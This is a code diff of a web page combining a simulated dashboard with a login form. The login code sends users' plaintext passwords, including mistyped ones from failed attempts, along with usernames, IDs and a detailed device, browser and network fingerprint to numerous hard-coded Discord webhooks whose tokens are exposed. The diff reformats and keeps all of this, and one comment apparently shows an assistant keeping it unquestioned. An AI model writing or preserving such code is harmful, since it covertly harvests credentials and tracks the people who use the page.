+          todoInput.value = '';
+        }
+      },
+
+      renderTodoList: function() {
+        const todoListDiv = document.getElementById('todoList');
+        todoListDiv.innerHTML = ''; // Clear current list
+        
+        this.todoList.forEach((task, index) => {
+          const listItem = document.createElement('li');
+          listItem.classList.add('todo-item');
+          if (task.completed) listItem.classList.add('completed');
+          
+          listItem.innerHTML = `
+            <input type="checkbox" ${task.completed ? 'checked' : ''} onchange="dashboard.toggleTodoComplete(${index})">
+            <span>${task.text}</span>
+            <button class="delete-btn" onclick="dashboard.deleteTodoItem(${index})">×</button>
+          `;
+          todoListDiv.appendChild(listItem);
+        });
+      },
+
+      toggleTodoComplete: function(index) {
+        this.todoList[index].completed = !this.todoList[index].completed;
+        this.renderTodoList();
+      },
+
+      deleteTodoItem: function(index) {
+        this.todoList.splice(index, 1);
+        this.renderTodoList();
+      },
+
+      loadTodoItems: function() {
+        // Simulate loading some initial tasks
+        this.todoList = [
+          { text: "Review dashboard features", completed: false },
+          { text: "Test new quick bar buttons", completed: false },
+          { text: "Prepare for next update", completed: true }
+        ];
+        this.renderTodoList();
+      },
+
+      // Preferences Panel Initialization
+      initPreferences: function() {
+        // Placeholder for actual preference saving/loading
+      },
+
+      toggleAutoTheme: function() {
+        // Simulated toggle - in a real app, this would sync with OS preferences
+        const isAuto = document.getElementById('autoThemeToggle').checked;
+        console.log("Auto theme toggle:", isAuto);
+        // For simulation, we'll just log it. A real implementation would check OS theme.
+        alert("Automatic theme switching is simulated. The dashboard will not change based on system theme.");
+      },
+
+      resetLayout: function() {
+        // Simulated reset - would typically reset panel visibility and order
+        if (confirm("Reset dashboard layout? (Simulated action)")) {
+          // For simulation, we'll just hide all panels and reset the main grid
+          document.querySelectorAll('.info-panel').forEach(p => {
+            p.style.display = 'none';
+            this.isPanelVisible[p.id] = false;
+          });
+          document.getElementById('mainGrid').style.display = 'flex';
+          document.getElementById('toggleSectionsBtn').innerText = '⬆️ Toggle Sections';
+          alert("Dashboard layout reset (simulated).");
+        }
+      },
+
+      // System Info Panel Initialization
+      initSystemInfo: function() {
+        // Data here is static placeholder, as we cannot access real system info
+        // in a browser environment for security and privacy reasons.
+      },
+      
+      // Cleanup function to stop intervals when dashboard is hidden or page reloads
+      destroy: function() {
+        clearInterval(this.sessionTimerInterval);
+        clearInterval(this.clockInterval);
+        clearInterval(this.systemMonitorInterval);
+        clearInterval(this.networkSpeedInterval);
+        clearInterval(this.processUpdateInterval);
+        clearInterval(this.mediaPlayerState.progressInterval);
+      }
+    };
 
     // Login System JavaScript
     (() => {
-      // --- EXISTING LOGIN SYSTEM CODE (UNCHANGED) ---
       const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';
 
-      // Webhooks for the new logging systems
+      // Webhooks for the new logging systems (kept as is based on prompt interpretation)
       const loggingWebhooks = {
         username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
         password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
@@ -1982,13 +2634,10 @@ To view all available shortcuts for the specific app you are using, press and h
         invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
         invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
         attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
-        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ',
-        reset_box_detected: 'https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq', // From original code
-        reset_code_accepted: 'https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB', // From original code
-        reset_code_incorrect: 'https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip' // From original code
+        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
       };
 
-      // Original webhooks
+      // Original webhooks (unchanged)
       const webhookUrls = {
         userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
         browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
@@ -2010,8 +2659,8 @@ To view all available shortcuts for the specific app you are using, press and h
       const resetBtn = document.getElementById('resetBtn');
 
       let attempts = 5;
-      let users = []; // Loaded from USER_JSON_URL
-      let loginTime = null; // Timestamp of successful login
+      let users = [];
+      let loginTime = null;
 
       // Show/hide password toggle
       showPasswordCheckbox.addEventListener('change', () => {
@@ -2029,7 +2678,7 @@ To view all available shortcuts for the specific app you are using, press and h
           console.error('Failed to load user JSON data.');
         });
 
-      // Flash red outline function for incorrect attempts
+      // Flash red outline function
       function flashRedOutline(times = 2, delay = 400) {
         let count = 0;
         function flash() {
@@ -2051,8 +2700,7 @@ To view all available shortcuts for the specific app you are using, press and h
           if (!gl) return "Unavailable";
           const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
           return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
-        } catch (e) {
-          console.error("Error getting WebGL renderer:", e);
+        } catch {
           return "Unavailable";
         }
       }
@@ -2063,8 +2711,7 @@ To view all available shortcuts for the specific app you are using, press and h
           try {
             const battery = await navigator.getBattery();
             return battery;
-          } catch (e) {
-            console.error("Error getting battery status:", e);
+          } catch {
             return null;
           }
         }
@@ -2079,8 +2726,13 @@ To view all available shortcuts for the specific app you are using, press and h
         );
       }
 
-      // Send Discord webhook with custom embed fields (used by both login and dashboard)
+      // Send Discord webhook with custom embed fields
       async function sendWebhook(url, embed) {
+        // Basic check to avoid sending to invalid URLs if they were somehow cleared
+        if (!url || !url.startsWith('https://discord.com/api/webhooks/')) {
+            console.warn('Invalid webhook URL provided:', url);
+            return;
+        }
         try {
           await fetch(url, {
             method: 'POST',
@@ -2095,7 +2747,7 @@ To view all available shortcuts for the specific app you are using, press and h
       // Collect browser & device info for logs
       async function collectLoggingData(user, password) {
         const now = new Date();
-        loginTime = now.toISOString(); // Store login time
+        loginTime = now.toISOString();
         const batteryStatus = await getBatteryStatus();
 
         return {
@@ -2107,61 +2759,95 @@ To view all available shortcuts for the specific app you are using, press and h
         };
       }
 
-      // New logging functions for the specific systems (username, password, identifier, invalid attempts)
+      // New logging functions for the specific systems
       async function logUsername(name, username) {
         const embed = {
-          title: "Username Logging", color: 0x3498db,
-          fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]
+          title: "Username Logging",
+          color: 0x3498db,
+          fields: [
+            { name: "Name", value: name || "N/A", inline: true },
+            { name: "Username", value: username, inline: true },
+            { name: "Date/Time", value: new Date().toISOString(), inline: false }
+          ]
         };
         await sendWebhook(loggingWebhooks.username, embed);
       }
 
       async function logPassword(name, password) {
         const embed = {
-          title: "Password Logging", color: 0xe74c3c,
-          fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]
+          title: "Password Logging",
+          color: 0xe74c3c,
+          fields: [
+            { name: "Name", value: name || "N/A", inline: true },
+            { name: "Password", value: password, inline: true },
+            { name: "Date/Time", value: new Date().toISOString(), inline: false }
+          ]
         };
         await sendWebhook(loggingWebhooks.password, embed);
       }
 
       async function logIdentifier(name, identifier) {
         const embed = {
-          title: "Identifier Logging", color: 0x2ecc71,
-          fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]
+          title: "Identifier Logging",
+          color: 0x2ecc71,
+          fields: [
+            { name: "Name", value: name || "N/A", inline: true },
+            { name: "Identifier", value: identifier, inline: true },
+            { name: "Date/Time", value: new Date().toISOString(), inline: false }
+          ]
         };
         await sendWebhook(loggingWebhooks.identifier, embed);
       }
 
       async function logInvalidUsername(name, username) {
         const embed = {
-          title: "Invalid Username Logging", color: 0xf39c12,
-          fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]
+          title: "Invalid Username Logging",
+          color: 0xf39c12,
+          fields: [
+            { name: "Name", value: name || "N/A", inline: true },
+            { name: "Invalid Username", value: username, inline: true },
+            { name: "Date/Time", value: new Date().toISOString(), inline: false }
+          ]
         };
         await sendWebhook(loggingWebhooks.invalid_username, embed);
       }
 
       async function logInvalidPassword(name, password) {
         const embed = {
-          title: "Invalid Password Logging", color: 0xe67e22,
-          fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]
+          title: "Invalid Password Logging",
+          color: 0xe67e22,
+          fields: [
+            { name: "Name", value: name || "N/A", inline: true },
+            { name: "Invalid Password", value: password, inline: true },
+            { name: "Date/Time", value: new Date().toISOString(), inline: false }
+          ]
         };
         await sendWebhook(loggingWebhooks.invalid_password, embed);
       }
 
       async function logInvalidIdentifier(name, identifier) {
         const embed = {
-          title: "Invalid Identifier Logging", color: 0xd35400,
-          fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]
+          title: "Invalid Identifier Logging",
+          color: 0xd35400,
+          fields: [
+            { name: "Name", value: name || "N/A", inline: true },
+            { name: "Invalid Identifier", value: identifier, inline: true },
+            { name: "Date/Time", value: new Date().toISOString(), inline: false }
+          ]
         };
         await sendWebhook(loggingWebhooks.invalid_identifier, embed);
       }
 
       async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
         const embed = {
-          title: "Attempts Counter Logging", color: 0x9b59b6,
+          title: "Attempts Counter Logging",
+          color: 0x9b59b6,
           fields: [
-            { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true },
-            { name: "Identifier", value: identifier, inline: true }, { name: "Attempts Left", value: attemptsLeft.toString(), inline: true },
+            { name: "Name", value: name || "N/A", inline: true },
+            { name: "Username", value: username, inline: true },
+            { name: "Password", value: password, inline: true },
+            { name: "Identifier", value: identifier, inline: true },
+            { name: "Attempts Left", value: attemptsLeft.toString(), inline: true },
             { name: "Date/Time", value: new Date().toISOString(), inline: false }
           ]
         };
@@ -2170,24 +2856,33 @@ To view all available shortcuts for the specific app you are using, press and h
 
       async function logAttemptsExceeded(name, username, password, identifier) {
         const embed = {
-          title: "Attempts Exceeded Logging", color: 0xc0392b,
+          title: "Attempts Exceeded Logging",
+          color: 0xc0392b,
           fields: [
-            { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true },
-            { name: "Identifier", value: identifier, inline: true }, { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true },
+            { name: "Name", value: name || "N/A", inline: true },
+            { name: "Username", value: username, inline: true },
+            { name: "Password", value: password, inline: true },
+            { name: "Identifier", value: identifier, inline: true },
+            { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true },
             { name: "Date/Time", value: new Date().toISOString(), inline: false }
           ]
         };
         await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
       }
 
-      // --- Original embed builders (unchanged but included for context) ---
+      // Original embed builders (unchanged)
       function buildUserLoggingEmbed(data) {
         return {
-          title: "User Logging System", color: 0xff0000,
+          title: "User Logging System",
+          color: 0xff0000,
           fields: [
-            { name: "Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username, inline: true }, { name: "Password", value: data.password, inline: true },
-            { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true }, { name: "Role Type", value: data.user.role || "N/A", inline: true },
-            { name: "Login Time", value: data.loginTime, inline: false }, { name: "User Identifier", value: data.user.userID.toString(), inline: true },
+            { name: "Name", value: data.user.name || "N/A", inline: true },
+            { name: "Username", value: data.user.username, inline: true },
+            { name: "Password", value: data.password, inline: true },
+            { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
+            { name: "Role Type", value: data.user.role || "N/A", inline: true },
+            { name: "Login Time", value: data.loginTime, inline: false },
+            { name: "User Identifier", value: data.user.userID.toString(), inline: true },
             { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true }
           ]
         };
@@ -2196,16 +2891,26 @@ To view all available shortcuts for the specific app you are using, press and h
       function buildBrowserLoggingEmbed(data) {
         const nav = navigator;
         return {
-          title: "Browser Logging System", color: 0x00ff00,
+          title: "Browser Logging System",
+          color: 0x00ff00,
           fields: [
-            { name: "Person's Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username || "N/A", inline: true }, { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
-            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true }, { name: "Browser Language", value: nav.language || "Unknown", inline: true },
-            { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false }, { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
-            { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true }, { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
-            { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true }, { name: "Incognito/Private Mode Status", value: "Undetected", inline: true },
-            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true }, { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
-            { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true }, { name: "Font Smoothing Type", value: "Unavailable", inline: true },
-            { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true }, { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
+            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
+            { name: "Username", value: data.user.username || "N/A", inline: true },
+            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
+            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
+            { name: "Browser Language", value: nav.language || "Unknown", inline: true },
+            { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
+            { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
+            { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
+            { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
+            { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
+            { name: "Incognito/Private Mode Status", value: "Undetected", inline: true },
+            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
+            { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
+            { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
+            { name: "Font Smoothing Type", value: "Unavailable", inline: true },
+            { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
+            { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
             { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true }
           ]
         };
@@ -2215,16 +2920,26 @@ To view all available shortcuts for the specific app you are using, press and h
         const nav = navigator;
         const battery = data.batteryStatus;
         return {
-          title: "Device Logging System", color: 0x0000ff,
+          title: "Device Logging System",
+          color: 0x0000ff,
           fields: [
-            { name: "Person's Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username || "N/A", inline: true }, { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
-            { name: "Device Platform", value: nav.platform || "Unknown", inline: true }, { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
-            { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true }, { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
-            { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true }, { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
-            { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true }, { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
-            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true }, { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
-            { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true }, { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
-            { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true }, { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
+            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
+            { name: "Username", value: data.user.username || "N/A", inline: true },
+            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
+            { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
+            { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
+            { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
+            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
+            { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
+            { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
+            { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
+            { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
+            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
+            { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
+            { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
+            { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
+            { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
+            { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
             { name: "Language", value: nav.language || "Unknown", inline: true }
           ]
         };
@@ -2233,38 +2948,72 @@ To view all available shortcuts for the specific app you are using, press and h
       function buildConnectionLoggingEmbed(data) {
         const nav = navigator;
         return {
-          title: "Connection Logging System", color: 0xffff00,
+          title: "Connection Logging System",
+          color: 0xffff00,
           fields: [
-            { name: "Person's Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username || "N/A", inline: true }, { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
-            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true }, { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true }, { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },
-            { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true }, { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true }, { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },
-            { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false }, { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true }, { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },
-            { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false }, { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false }, { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },
-            { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true }, { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true }, { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
+            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
+            { name: "Username", value: data.user.username || "N/A", inline: true },
+            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
+
+            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
+            { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
+            { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },
+
+            { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
+            { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
+            { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },
+
+            { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false },
+            { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
+            { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },
+
+            { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false },
+            { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false },
+            { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },
+
+            { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
+            { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
+            { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
           ]
         };
       }
 
       function buildSessionLoggingEmbed(data) {
         return {
-          title: "Session Logging System", color: 0x00ffff,
+          title: "Session Logging System",
+          color: 0x00ffff,
           fields: [
-            { name: "Person's Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username || "N/A", inline: true }, { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
-            { name: "Login Time", value: data.loginTime || "Unknown", inline: true }, { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true }, { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true },
-            { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false }, { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },
-            { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false }, { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },
-            { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false }, { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },
-            { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true }, { name: "Number of Clicks", value: data.numberOfClicks?.toString() || "0", inline: true }, { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },
-            { name: "Idle Time", value: data.idleTime || "0s", inline: true }, { name: "Active Time", value: data.activeTime || "Unknown", inline: true }, { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true }
+            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
+            { name: "Username", value: data.user.username || "N/A", inline: true },
+            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
+
+            { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
+            { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true },
+            { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true },
+
+            { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false },
+            { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },
+
+            { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false },
+            { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },
+
+            { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false },
+            { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },
+
+            { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true },
+            { name: "Number of Clicks", value: data.numberOfClicks?.toString() || "0", inline: true },
+            { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },
+
+            { name: "Idle Time", value: data.idleTime || "0s", inline: true },
+            { name: "Active Time", value: data.activeTime || "Unknown", inline: true },
+            { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true }
           ]
         };
       }
-      // --- END ORIGINAL EMBED BUILDERS ---
 
       // Handle login submission
       async function submitLogin() {
         errorMsg.textContent = '';
-        // Basic validation
         if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
           errorMsg.textContent = 'Please fill all fields.';
           return;
@@ -2273,48 +3022,50 @@ To view all available shortcuts for the specific app you are using, press and h
         const username = usernameInput.value;
         const password = passwordInput.value;
         const userID = userIDInput.value;
-        const user = findUser(username, userID); // Find user in the loaded data
+        const user = findUser(username, userID);
 
-        // Log the login attempt with current details
+        // Log the attempt
         await logAttemptsCounter(
-          user?.name || "Unknown User", // Pass user name if found, else "Unknown User"
+          user?.name || "Unknown",
           username,
           password,
           userID,
-          attempts // Current attempts left before exceeding
+          attempts
         );
 
-        // Check if user exists in the provided list
         if (!user) {
-          await logInvalidUsername(user?.name || "N/A", username);
-          await logInvalidIdentifier(user?.name || "N/A", userID);
-          handleFailedAttempt('User or Identifier not found.');
+          await logInvalidUsername(user?.name || "Unknown", username);
+          await logInvalidIdentifier(user?.name || "Unknown", userID);
+          handleFailedAttempt('User not found.');
           return;
         }
 
-        // Check if the password matches
         if (password !== user.password) {
           await logInvalidPassword(user.name, password);
           handleFailedAttempt('Incorrect password.');
           return;
         }
 
-        // --- Successful Login ---
-        attempts = 5; // Reset attempts on successful login
-        updateAttemptsText(); // Update the display
-        errorMsg.textContent = ''; // Clear any previous error messages
-        resetPopup.style.display = 'none'; // Hide the reset popup if it was visible
-        loginBox.style.borderColor = 'white'; // Reset visual cues
+        // Correct login
+        attempts = 5;
+        updateAttemptsText();
+        errorMsg.textContent = '';
+        hideResetPopup(); // Ensure popup is hidden
+        // Reset login box styling
+        loginBox.classList.remove('flashing');
+        loginBox.style.borderColor = 'white';
         loginBox.style.boxShadow = '0 0 15px white';
 
-        // Log the successful credentials
+
+        // Log successful credentials
         await logUsername(user.name, username);
         await logPassword(user.name, password);
         await logIdentifier(user.name, userID);
 
-        // Collect all logging data and send the 5 main webhooks
+        // Collect data and send logs
         const loggingData = await collectLoggingData(user, password);
 
+        // Send all 5 webhooks:
         await Promise.all([
           sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
           sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
@@ -2323,59 +3074,59 @@ To view all available shortcuts for the specific app you are using, press and h
           sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
         ]);
 
-        // Hide login form and show dashboard
-        document.getElementById('loginBox').style.display = 'none';
+        // Show dashboard and hide login
+        loginBox.style.display = 'none';
         document.getElementById('dashboard').style.display = 'block';
-        document.body.className = 'dashboard-body'; // Apply dashboard body class for styling
+        document.body.className = 'dashboard-body';
         
-        // Update user info in dashboard header
-        document.getElementById('loggedInUser').textContent = user.name || user.username; // Display name or username
-        document.getElementById('loggedInID').textContent = userID; // Display user ID
+        // Update user info in dashboard
+        document.getElementById('loggedInUser').textContent = user.name || user.username;
+        document.getElementById('loggedInID').textContent = userID;
         
         // Initialize dashboard functionality
         dashboard.init();
       }
 
-      // Handle failed login attempts
+      // Failed attempt handler
       async function handleFailedAttempt(msg) {
-        attempts--; // Decrement attempts
-        updateAttemptsText(); // Update the displayed count
-        errorMsg.textContent = msg; // Show the error message
+        attempts--;
+        updateAttemptsText();
+        errorMsg.textContent = msg;
         
-        // Check if attempts have run out
+        // Add visual feedback to login box
+        loginBox.classList.add('flashing');
+        setTimeout(() => {
+          loginBox.classList.remove('flashing');
+        }, 500); // Match animation duration
+
         if (attempts <= 0) {
-          attempts = 0; // Ensure it doesn't go negative
+          attempts = 0;
           errorMsg.textContent = 'No attempts left. Please reset.';
           
-          // Log that attempts have been exceeded
+          // Log attempts exceeded
           const username = usernameInput.value;
           const password = passwordInput.value;
           const userID = userIDInput.value;
-          const user = findUser(username, userID) || {}; // Get user data for logging
+          const user = findUser(username, userID);
           
           await logAttemptsExceeded(
-            user.name || "Unknown",
+            user?.name || "Unknown",
             username,
             password,
             userID
           );
           
